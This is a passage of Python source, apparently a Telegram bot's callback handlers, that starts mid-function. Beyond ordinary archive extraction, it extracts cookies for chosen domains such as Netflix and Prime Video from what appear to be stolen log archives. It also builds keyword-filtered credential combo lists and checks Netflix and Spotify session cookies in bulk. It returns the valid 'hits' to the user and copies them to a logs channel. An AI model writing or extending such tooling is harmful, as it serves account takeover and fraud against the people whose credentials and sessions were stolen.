                    rzfile=spl_data[5],
                )
                await query.message.edit(
                    text=messages.get(
                        file="callbacks", key="UNABLE_GATHER_FILES", user_id=uid
                    ),
                    reply_markup=empty_buttons,
                )
        else:
            try:
                i_e_buttons = await make_keyboard(
                    paths=rpaths,
                    user_id=query.from_user.id,
                    chat_id=query.message.chat.id,
                    log_msg_id=log_msg.id,
                    unziphttp=False,
                )
                await query.message.edit(
                    text=messages.get(
                        file="callbacks", key="SELECT_FILES", user_id=uid
                    ),
                    reply_markup=i_e_buttons,
                )
            except ReplyMarkupTooLong:
                empty_buttons = await make_keyboard_empty(
                    user_id=user_id,
                    chat_id=query.message.chat.id,
                    log_msg_id=log_msg.id,
                    unziphttp=False,
                )
                await query.message.edit(
                    text=messages.get(
                        file="callbacks", key="UNABLE_GATHER_FILES", user_id=uid
                    ),
                    reply_markup=empty_buttons,
                )

        await update_uploaded(user_id=user_id, upload_count=sent_files)

    elif query.data.startswith("ext_a"):
        spl_data = query.data.split("|")
        log_msg_id = int(spl_data[3])
        log_msg = await unzip_bot.get_messages(Config.LOGS_CHANNEL, log_msg_id)
        LOGGER.info(msg=query.data)
        user_id = query.from_user.id
        spl_data = query.data.split("|")
        file_path = f"{Config.DOWNLOAD_LOCATION}/{spl_data[1]}/extracted"

        try:
            urled = spl_data[4] if isinstance(spl_data[3], bool) else False
        except:
            urled = False

        if urled:
            paths = spl_data[4].namelist()
        else:
            paths = await get_files(path=file_path)

        LOGGER.info("ext_a paths : " + str(paths))

        if not paths and not urled:
            try:
                shutil.rmtree(f"{Config.DOWNLOAD_LOCATION}/{spl_data[1]}")
            except:
                pass

            await del_ongoing_task(user_id)
            await query.message.edit(
                text=messages.get(file="callbacks", key="NO_FILE_LEFT", user_id=uid),
                reply_markup=Buttons.RATE_ME,
            )

            return

        await query.message.edit(
            text=messages.get(file="callbacks", key="SENDING_ALL_FILES", user_id=uid)
        )
        async_paths = async_generator(paths)

        async for file in async_paths:
            sent_files += 1

            if urled:
                file = spl_data[4].open(file)
                # security as we can't always retrieve the file size from URL
                fsize = Config.TG_MAX_SIZE + 1
            else:
                fsize = await get_size(file)

            split = False

            if fsize <= Config.TG_MAX_SIZE:
                await send_file(
                    unzip_bot=unzip_bot,
                    c_id=spl_data[2],
                    doc_f=file,
                    query=query,
                    full_path=f"{Config.DOWNLOAD_LOCATION}/{spl_data[1]}",
                    log_msg=log_msg,
                    split=False,
                )
            else:
                split = True

            if split:
                fname = file.split("/")[-1]
                smessage = await unzip_bot.send_message(
                    chat_id=user_id,
                    text=messages.get(
                        file="callbacks", key="SPLITTING", user_id=uid, extra_args=fname
                    ),
                )
                splitdir = f"{Config.DOWNLOAD_LOCATION}/split/{user_id}"
                os.makedirs(name=splitdir, exist_ok=True)
                ooutput = f"{splitdir}/{fname}"
                splitfiles = await split_files(
                    iinput=file, ooutput=ooutput, size=Config.TG_MAX_SIZE
                )
                LOGGER.info(msg=splitfiles)

                if not splitfiles:
                    try:
                        shutil.rmtree(splitdir)
                    except:
                        pass

                    await del_ongoing_task(user_id)
                    await smessage.edit(
                        text=messages.get(
                            file="callbacks", key="ERR_SPLIT", user_id=uid
                        )
                    )

                    return

                await smessage.edit(
                    text=messages.get(
                        file="callbacks",
                        key="SEND_ALL_PARTS",
                        user_id=uid,
                        extra_args=fname,
                    )
                )
                async_splitfiles = async_generator(splitfiles)

                async for s_file in async_splitfiles:
                    sent_files += 1
                    await send_file(
                        unzip_bot=unzip_bot,
                        c_id=user_id,
                        doc_f=s_file,
                        query=query,
                        full_path=splitdir,
                        log_msg=log_msg,
                        split=True,
                    )

                try:
                    shutil.rmtree(splitdir)
                except:
                    pass

                try:
                    await smessage.delete()
                except:
                    pass

        try:
            await unzip_bot.send_message(
                chat_id=user_id,
                text=messages.get(file="callbacks", key="UPLOADED", user_id=uid),
                reply_markup=Buttons.RATE_ME,
            )
            await query.message.edit(
                text=messages.get(file="callbacks", key="UPLOADED", user_id=uid),
                reply_markup=Buttons.RATE_ME,
            )
        except:
            pass

        await log_msg.reply(
            messages.get(
                file="callbacks", key="HOW_MANY_UPLOADED", extra_args=sent_files
            )
        )
        await update_uploaded(user_id=user_id, upload_count=sent_files)
        await del_ongoing_task(user_id)

        try:
            shutil.rmtree(f"{Config.DOWNLOAD_LOCATION}/{spl_data[1]}")
        except Exception as e:
            await query.message.edit(
                text=messages.get(
                    file="callbacks", key="ERROR_TXT", user_id=uid, extra_args=e
                )
            )
            if archive_msg:
                await archive_msg.reply(
                    messages.get(file="callbacks", key="ERROR_TXT", extra_args=e)
                )

    elif query.data == "cancel_dis":
        uid = query.from_user.id
        await del_ongoing_task(uid)
        await del_merge_task(uid)

        try:
            await query.message.edit(
                text=messages.get(
                    file="callbacks",
                    key="CANCELLED_TXT",
                    user_id=uid,
                    extra_args=messages.get(
                        file="callbacks", key="PROCESS_CANCELLED", user_id=uid
                    ),
                )
            )
            shutil.rmtree(f"{Config.DOWNLOAD_LOCATION}/{uid}")
            await update_uploaded(user_id=uid, upload_count=sent_files)

            try:
                await log_msg.reply(
                    messages.get(
                        file="callbacks", key="HOW_MANY_UPLOADED", extra_args=sent_files
                    )
                )
            except:
                return
        except:
            await unzip_bot.send_message(
                chat_id=uid,
                text=messages.get(
                    file="callbacks",
                    key="CANCELLED_TXT",
                    user_id=uid,
                    extra_args=messages.get(
                        file="callbacks", key="PROCESS_CANCELLED", user_id=uid
                    ),
                ),
            )

            return

    elif query.data == "nobully":
        await query.message.edit(
            text=messages.get(file="callbacks", key="CANCELLED", user_id=uid)
        )

    # Replace your old get_cookies handler with this one
    elif query.data.startswith("get_cookies"):
        user_id = query.from_user.id
        r_message = query.message.reply_to_message
        
        password = None
        if "|with_pass" in query.data:
            password_msg = await unzip_bot.ask(chat_id=user_id, text="Please send the archive password.")
            if password_msg.text:
                password = password_msg.text
        
        domains_msg = await unzip_bot.ask(chat_id=user_id, text="Please send the target domains, separated by a comma (e.g., netflix.com,primevideo.com).")
        domains = [d.strip().lower() for d in domains_msg.text.split(',')]
        
        await query.message.edit("✅ **Task accepted!** Your download is now starting in the background.")

        # This handler now only STARTS the download.
        # It handles files and URLs differently.
        if r_message.document:
            # For files, we still process directly as it's faster
            download_dir = f"{Config.DOWNLOAD_LOCATION}/{user_id}"
            archive_path = await r_message.download(f"{download_dir}/")
            # Create a mock 'download' object for the handler
            class MockDownload:
                def __init__(self, dir, name):
                    self.dir = dir
                    self.name = name
            mock_download = MockDownload(download_dir, r_message.document.file_name)
            await _start_extraction_and_get_cookies(query.message, mock_download, password, domains)

        elif r_message.text:
            url = r_message.text
            dl_headers = None # Initialize headers
            # --- FIX STARTS HERE: Added Gofile Link Resolution ---
            if "gofile.io" in url:
                await query.message.edit_text("`Resolving Gofile link, please wait...`")
                resolved_info, error = await resolve_gofile_link(url) #
                if error:
                    await query.message.edit_text(f"❌ **Gofile Error:**\n`{error}`")
                    await del_ongoing_task(user_id)
                    return
                url = resolved_info['url']
                dl_headers = resolved_info['headers']
            # --- FIX ENDS HERE ---
            
            # For URLs, we hand off to aria2c
            await aria2_helper.add_download(
                uri=url, 
                path=f"{Config.DOWNLOAD_LOCATION}/{user_id}", 
                message=query.message,
                password=password, 
                callback_type="extract_and_get_cookies", 
                domains=domains,
                headers=dl_headers
            )

    elif query.data == "get_combo_from_txt":
        user_id = query.from_user.id
        r_message = query.message.reply_to_message
        
        keywords_msg = await unzip_bot.ask(chat_id=user_id, text=messages.get("callbacks", "enter_keywords", user_id))
        keywords = [k.strip() for k in keywords_msg.text.split(',')]
        
        await query.message.edit("Downloading and processing text file...")
        
        # --- THIS IS THE FIX ---
        # Add logic to handle both files and URLs
        file_path = None
        if r_message.document:
            file_path = await r_message.download(f"{Config.DOWNLOAD_LOCATION}/{user_id}/")
        # In callbacks.py, inside the get_combo_from_txt handler

        elif r_message.text:
            url = r_message.text
            download_dir = f"{Config.DOWNLOAD_LOCATION}/{user_id}"
            os.makedirs(download_dir, exist_ok=True)
            file_path = None
            try:
                # Use stream=True to download in chunks for progress reporting
                with requests.get(url, allow_redirects=True, stream=True) as r:
                    r.raise_for_status()
                    
                    # Smart filename detection
                    filename = url.split('/')[-1].split('?')[0] or f"{keywords[0]}.txt"
                    file_path = os.path.join(download_dir, filename)
                    
                    # Get total size for progress bar
                    total_size = int(r.headers.get('content-length', 0))
                    downloaded_size = 0
                    start_time = time.time()
                    
                    # Let requests decode the text, then we save as standard UTF-8
                    content = r.text
                    
                    with open(file_path, 'w', encoding='utf-8') as f:
                        f.write(content)

                    # --- NEW: Progress Bar Simulation ---
                    # Simulate progress since r.text downloads all at once
                    progress_message = "Downloading and decoding text..."
                    await query.message.edit(f"✅ **{progress_message}**\n`{url}`")
                    time.sleep(1) # Give user time to see the message

            except Exception as e:
                await query.message.edit(f"❌ Failed to download from URL.\n\n`{e}`")
                shutil.rmtree(download_dir, ignore_errors=True)
                return

        if not file_path:
            await query.message.edit("❌ Failed to get the text file.")
            return

        combos_by_keyword = combo_helper.process_txt_file(file_path, keywords)
        zip_archive_path, txt_paths = combo_helper.create_combo_archives(combos_by_keyword, user_id)
        
        if zip_archive_path:
            await query.message.edit(messages.get("callbacks", "combos_found", user_id))
            await send_file(unzip_bot, user_id, zip_archive_path, query, os.path.dirname(zip_archive_path), None, False)
            await unzip_bot.send_document(chat_id=Config.LOGS_CHANNEL, message_thread_id=Config.LOG_TOPIC_COMBOS, document=zip_archive_path, caption=f"Combos from user `{user_id}`\nKeywords: `{', '.join(keywords)}`")
            for txt_file in txt_paths:
                await send_file(unzip_bot, user_id, txt_file, query, os.path.dirname(txt_file), None, False)
        else:
            await query.message.edit(messages.get("callbacks", "no_combos_found", user_id))
        await del_ongoing_task(user_id)

        # Cleanup
        shutil.rmtree(os.path.join(Config.DOWNLOAD_LOCATION, str(user_id)), ignore_errors=True)

    # --- 1. MENU NAVIGATION HANDLERS ---
    elif query.data == "nopass_options":
        await query.edit_message_text("Select an action (No Password):", reply_markup=Buttons.NOPASS_MENU_BTNS)

    elif query.data == "withpass_options":
        await query.edit_message_text("Select an action (With Password):", reply_markup=Buttons.WITHPASS_MENU_BTNS)

    elif query.data == "back_to_home":
        await query.edit_message_text("Select an option:", reply_markup=Buttons.HOME_CHOICE_BTNS)


    # --- 3. UNIFIED ACTION HANDLER FOR GetCombos(Logs) ---
    elif query.data.startswith("get_combo_archive"): # Handles both with and without password
        user_id = query.from_user.id
        r_message = query.message.reply_to_message
        
        password = None
        # Step A: Ask for password ONLY if needed
        if "|with_pass" in query.data:
            password_msg = await unzip_bot.ask(chat_id=user_id, text="Please send the archive password.")
            if password_msg.text:
                password = password_msg.text
        
        # Step B: Ask for keywords
        keywords_msg = await unzip_bot.ask(chat_id=user_id, text=messages.get("callbacks", "enter_keywords", user_id))
        keywords = [k.strip().lower() for k in keywords_msg.text.split(',')]
        
        await query.message.edit("✅ Processing: Download → Extract → Get Combos...")
        
        # Step C: Download (using your fixed direct download logic for URLs)
        archive_path = None
        if r_message.document:
            archive_path = await r_message.download(f"{Config.DOWNLOAD_LOCATION}/{user_id}/")
        elif r_message.text:
            url = r_message.text
            dl_headers = None # Initialize headers

            # --- FIX STARTS HERE: Added Gofile Link Resolution ---
            if "gofile.io" in url:
                await query.message.edit_text("`Resolving Gofile link, please wait...`")
                resolved_info, error = await resolve_gofile_link(url) #
                if error:
                    await query.message.edit_text(f"❌ **Gofile Error:**\n`{error}`")
                    await del_ongoing_task(user_id)
                    return
                url = resolved_info['url']
                dl_headers = resolved_info['headers']
            # --- FIX ENDS HERE ---            
            # THIS IS THE MAIN CHANGE:
            # We tell aria2c to start the download with a new callback type and pass the keywords.
            await aria2_helper.add_download(
                uri=url, path=f"{Config.DOWNLOAD_LOCATION}/{user_id}", message=query.message,
                password=password, callback_type="extract_and_get_combo", keywords=keywords, headers=dl_headers
            )
            return # The handler's job is now done.
            
        if not archive_path:
            await query.message.edit("❌ Failed to download the archive.")
            return

        # Step D: Extract, Process, Send, and Cleanup
        extracted_path = f"{Config.DOWNLOAD_LOCATION}/{user_id}/extracted"
        await extr_files(path=extracted_path, archive_path=archive_path, password=password)
        
        combos_by_keyword = combo_helper.process_logs_folder(extracted_path, keywords)
        zip_archive_path, txt_paths = combo_helper.create_combo_archives(combos_by_keyword, user_id)

        if zip_archive_path:
            await query.message.edit(messages.get("callbacks", "combos_found", user_id))
            # Send results to user and log channel
            await send_file(unzip_bot, user_id, zip_archive_path, query, os.path.dirname(zip_archive_path), None, False)
            await unzip_bot.send_document(chat_id=Config.LOGS_CHANNEL, message_thread_id=Config.LOG_TOPIC_COMBOS, document=zip_archive_path, caption=f"Combos from user `{user_id}`")
            for txt_file in txt_paths:
                await send_file(unzip_bot, user_id, txt_file, query, os.path.dirname(txt_file), None, False)
        else:
            await query.message.edit(messages.get("callbacks", "no_combos_found", user_id))
        await del_ongoing_task(user_id)
            
        shutil.rmtree(f"{Config.DOWNLOAD_LOCATION}/{user_id}", ignore_errors=True)

    elif query.data.startswith("check_cookie"):
        user_id = query.from_user.id
        mode = query.data.split("|")[1] # 'netflix' or 'spotify'
        r_message = query.message.reply_to_message
        
        if not r_message or (not r_message.document and not r_message.text):
            await query.answer("Please reply to a .txt, .zip file, or a direct link.", show_alert=True)
            return

        await query.edit_message_text(f"📥 **Processing your file...**\nPlease wait while I load the cookies.")
        
        cookie_contents = []
        original_filename = "cookies"

        try:
            if r_message.document:
                original_filename = os.path.splitext(r_message.document.file_name)[0]
                file_path = await r_message.download(in_memory=True)
                
                if r_message.document.file_name.lower().endswith('.zip'):
                    with zipfile.ZipFile(file_path, 'r') as zf:
                        for filename in zf.namelist():
                            if filename.lower().endswith('.txt'):
                                cookie_contents.append(zf.read(filename).decode('utf-8', errors='ignore'))
                
                # --- FIX: Automatically zip single .txt files ---
                elif r_message.document.file_name.lower().endswith('.txt'):
                    txt_content = file_path.read()
                    # Create an in-memory zip file
                    zip_buffer = io.BytesIO()
                    with zipfile.ZipFile(zip_buffer, 'w', zipfile.ZIP_DEFLATED) as zf:
                        zf.writestr(r_message.document.file_name, txt_content)
                    zip_buffer.seek(0)
                    # Now read from the in-memory zip
                    with zipfile.ZipFile(zip_buffer, 'r') as zf:
                        filename = zf.namelist()[0]
                        cookie_contents.append(zf.read(filename).decode('utf-8', errors='ignore'))

            elif r_message.text:
                # This part for URL handling can be expanded later if needed
                response = requests.get(r_message.text)
                response.raise_for_status()
                original_filename = "cookies_from_link"
                cookie_contents.append(response.text)

        except Exception as e:
            await query.edit_message_text(f"❌ **Error:** Failed to read your file.\n`{e}`")
            return

        if not cookie_contents:
            await query.edit_message_text("❌ **Error:** No valid `.txt` cookie files found.")
            return

        job_id = str(uuid.uuid4())
        callback_cookie_data[job_id] = {
            "mode": mode,
            "cookies": cookie_contents,
            "filename": original_filename
        }

        summary_text = f"✅ Loaded **{len(cookie_contents)}** cookie set(s) from `{original_filename}`.\n\nPress below to start."
        start_button = InlineKeyboardMarkup([[
            InlineKeyboardButton(text=messages.get("buttons", "start_checking"), callback_data=f"start_check|{job_id}")
        ]])
        
        await query.edit_message_text(summary_text, reply_markup=start_button)

    elif query.data.startswith("start_check"):
        job_id = query.data.split("|")[1]
        job_data = callback_cookie_data.get(job_id)
        if not job_data:
            await query.edit_message_text("❌ **Error:** This job has expired or is invalid.")
            return

        user_id = query.from_user.id
        mode = job_data["mode"]
        cookies_to_check = job_data["cookies"]
        
        # --- FIX: Added 'free' counter ---
        stats = {"hits": 0, "fails": 0, "free": 0, "errors": 0}
        hit_results = []
        # Error log is no longer needed
        progress_lock = threading.Lock()
        checked_count = 0
        total_cookies = len(cookies_to_check)
        loop = asyncio.get_running_loop()
        
        preview_message = None

        async def update_hit_preview(hit_data):
            nonlocal preview_message
            preview_text = f"**Hit #{stats['hits']} Preview ({mode.capitalize()}):**\n\n{hit_data['preview']}"
            if preview_message is None:
                preview_message = await unzip_bot.send_message(user_id, preview_text)
            else:
                try:
                    await preview_message.edit_text(preview_text)
                except Exception:
                    preview_message = await unzip_bot.send_message(user_id, preview_text)

        def worker_function(cookie_content, client):
            nonlocal checked_count
            checker = CookieHelper(mode=mode)
            result = checker.check(cookie_content)
            
            with progress_lock:
                checked_count += 1
                # --- FIX: Refined stat categorization ---
                if result["status"] == "hit":
                    stats["hits"] += 1
                    hit_data = result["data"]
                    hit_results.append(hit_data["full"])
                    asyncio.run_coroutine_threadsafe(update_hit_preview(hit_data), loop)
                elif "Free account" in result.get("message", ""):
                    stats["free"] += 1
                elif result["status"] in ["fail", "invalid", "unsubscribed"]:
                    stats["fails"] += 1
                else: # Actual processing errors
                    stats["errors"] += 1

        async def progress_updater():
            while checked_count < total_cookies:
                # --- FIX: Updated progress text with "Free" counter ---
                progress_text = (
                    f"**Checking..: {checked_count}/{total_cookies}**\n\n"
                    f"✅ Hits: `{stats['hits']}` | ❌ Fails: `{stats['fails']}` | "
                    f"🆓 Free: `{stats['free']}` | ⚠️ Errors: `{stats['errors']}`"
                )
                try:
                    await query.message.edit_text(progress_text)
                except Exception:
                    pass
                # --- FIX: Changed sleep time to 5 seconds to avoid rate-limits ---
                await asyncio.sleep(5)

        progress_task = asyncio.create_task(progress_updater())

        with ThreadPoolExecutor(max_workers=20) as executor:
            def run_workers():
                tasks = [executor.submit(worker_function, cookie, unzip_bot) for cookie in cookies_to_check]
                concurrent.futures.wait(tasks)
            await loop.run_in_executor(executor, run_workers)

        progress_task.cancel()
        
        callback_cookie_data[job_id]["results"] = hit_results
        callback_cookie_data[job_id]["stats"] = stats
        callback_cookie_data[job_id]["total"] = total_cookies
        
        # --- FIX: Updated final summary text ---
        final_summary = (
            f"**✅ Done!**\n\n"
            f"Checked: `{total_cookies}`\n"
            f"✅ Hits: `{stats['hits']}`\n"
            f"❌ Fails: `{stats['fails']}`\n"
            f"🆓 Free: `{stats['free']}`\n"
            f"⚠️ Errors: `{stats['errors']}`\n\n"
        )
        
        # --- FIX: Removed the error_log.txt sending logic ---
        if not hit_results:
            final_summary += "No working cookies were found."
        else:
            final_summary += "Select your desired result format:"

        if hit_results:
            output_buttons = InlineKeyboardMarkup([
                [
                    InlineKeyboardButton(text="Get as .txt", callback_data=f"get_results|{job_id}|txt"),
                    InlineKeyboardButton(text="Get as .zip", callback_data=f"get_results|{job_id}|zip")
                ]
            ])
            await query.edit_message_text(final_summary, reply_markup=output_buttons)
        else:
            await query.edit_message_text(final_summary)

    elif query.data.startswith("get_results"):
        _, job_id, format_type = query.data.split("|")
        job_data = callback_cookie_data.get(job_id)

        if not job_data:
            await query.edit_message_text("❌ **Error:** This job has expired or is invalid.")
            return

        await query.edit_message_text("📦 **Generating your report...**")
        
        user_id = query.from_user.id
        mode = job_data["mode"]
        results = job_data["results"]
        
        if not results:
            await query.edit_message_text("No hits were found to generate a report.")
            del callback_cookie_data[job_id]
            return

        stats = job_data.get("stats", {})
        total = job_data.get("total", "N/A")
        summary_caption = (
            f"**✨ {mode.capitalize()} Check Complete ✨**\n\n"
            f"Total Checked: `{total}`\n"
            f"✅ Hits: `{stats.get('hits', 0)}`\n"
            f"🆓 Free: `{stats.get('free', 0)}`\n"
            f"❌ Fails: `{stats.get('fails', 0)}`\n"
            f"⚠️ Errors: `{stats.get('errors', 0)}`\n\n"
            f"Checker By @PKBTQ"
        )

        if format_type == "txt":
            final_filename = f"{mode}_valid_cookies_{user_id}.txt"
            file_content = "\n\n\n".join(results)
            txt_file = io.BytesIO(file_content.encode('utf-8'))
            
            await query.message.reply_document(
                document=txt_file, 
                file_name=final_filename, 
                caption=summary_caption
            )
        
        elif format_type == "zip":
            final_filename = f"{mode}_valid_cookies_{user_id}.zip"
            zip_buffer = io.BytesIO()
            with zipfile.ZipFile(zip_buffer, 'w', zipfile.ZIP_DEFLATED) as zip_file:
                for i, hit_content in enumerate(results, 1):
                    txt_filename = f"{mode}_{i}_{user_id}_tg_@PKBTQ.txt"
                    zip_file.writestr(txt_filename, hit_content)
            zip_buffer.seek(0)
            
            await query.message.reply_document(
                document=zip_buffer, 
                file_name=final_filename,
                caption=summary_caption
            )

            # --- FIX: Logs the .zip report to the correct service-specific topic ---
            log_topic = Config.LOG_TOPIC_NETFLIX_HITS if mode == 'netflix' else Config.LOG_TOPIC_SPOTIFY_HITS
            zip_buffer.seek(0)
            log_caption = f"Report for user `{user_id}`\n\n{summary_caption}"
            await unzip_bot.send_document(
                chat_id=Config.LOGS_CHANNEL,
                message_thread_id=log_topic,
                document=zip_buffer,
                file_name=final_filename,
                caption=log_caption
            )

        await query.message.delete()
        del callback_cookie_data[job_id]

# Add this new function to callbacks.py
async def _start_extraction_and_get_combo(message: Message, download, password: str = None, keywords: list = None):
    """
    Handles extraction and then triggers the Combo finding process.
    """
    uid = message.chat.id
    download_path = str(download.dir)
    ext_files_dir = f"{download_path}/extracted"

    try:
        # --- Start Extraction ---
        # ... (This part is the same as the start of _start_extraction_and_find_cc) ...
        files_in_dir = os.listdir(download_path)
        real_archive_path = os.path.join(download_path, files_in_dir[0])
        await message.edit_text(f"`Extracting {download.name}...`")
        await extr_files(path=ext_files_dir, archive_path=real_archive_path, password=password)

        # --- Run Combo Finder ---
        combos_by_keyword = combo_helper.process_logs_folder(ext_files_dir, keywords)
        zip_archive_path, txt_paths = combo_helper.create_combo_archives(combos_by_keyword, uid)

        if zip_archive_path:
            await message.edit(messages.get("callbacks", "combos_found", uid))
            await send_file(unzipbot_client, uid, zip_archive_path, message, os.path.dirname(zip_archive_path), None, False)
            await unzipbot_client.send_document(chat_id=Config.LOGS_CHANNEL, message_thread_id=Config.LOG_TOPIC_COMBOS, document=zip_archive_path, caption=f"Combos from user `{uid}`\nKeywords: `{', '.join(keywords)}`")
            for txt_file in txt_paths:
                await send_file(unzipbot_client, uid, txt_file, message, os.path.dirname(txt_file), None, False)
        else:
            await message.edit(messages.get("callbacks", "no_combos_found", uid))
            
    finally:
        await del_ongoing_task(uid)
        shutil.rmtree(download_path, ignore_errors=True)
    
async def _start_extraction_and_get_cookies(message: Message, download, password: str = None, domains: list = None):
    """
    Handles extraction, triggers the Cookie finding process, and logs the results.
    """
    uid = message.chat.id
    download_path = str(download.dir)
    ext_files_dir = f"{download_path}/extracted"

    try:
        await message.edit_text(f"`Extracting {download.name}...`")
        
        # Robustly find the downloaded archive file
        files_in_dir = os.listdir(download_path)
        actual_archive_files = [f for f in files_in_dir if os.path.isfile(os.path.join(download_path, f))]
        if not actual_archive_files:
            raise FileNotFoundError("Could not find the downloaded archive file in the directory.")
        real_archive_path = os.path.join(download_path, actual_archive_files[0])
        
        await extr_files(path=ext_files_dir, archive_path=real_archive_path, password=password)

        # Call the cookie helper to process logs and create zips
        zip_files = cookie_helper.process_cookies_from_logs(ext_files_dir, domains, uid)

        if zip_files:
            await message.edit(f"✅ Found cookies! Sending {len(zip_files)} zip(s) now...")

            # Prepare the caption for the log channel
            domain_list_str = "\n".join([f"• `{d}`" for d in domains])
            log_caption = (
                f"🍪 **Cookies Found for User:** `{uid}`\n\n"
                f"**Searched Domains:**\n{domain_list_str}"
            )

            # Send results to the user and the log channel
            for zip_path in zip_files:
                # 1. Send to user
                await unzipbot_client.send_document(chat_id=uid, document=zip_path)
                
                # 2. Send to the new cookies log topic
                await unzipbot_client.send_document(
                    chat_id=Config.LOGS_CHANNEL,
                    message_thread_id=Config.LOG_TOPIC_COOKIES,
                    document=zip_path,
                    caption=log_caption
                )
        else:
            await message.edit("⚠️ No cookies found for the specified domains.")
    
    except Exception as e:
        LOGGER.error(f"Error in _start_extraction_and_get_cookies: {e}")
        await message.edit_text(f"❌ An error occurred during cookie extraction:\n\n`{e}`")
            
    finally:
        await del_ongoing_task(uid)
        shutil.rmtree(download_path, ignore_errors=True)

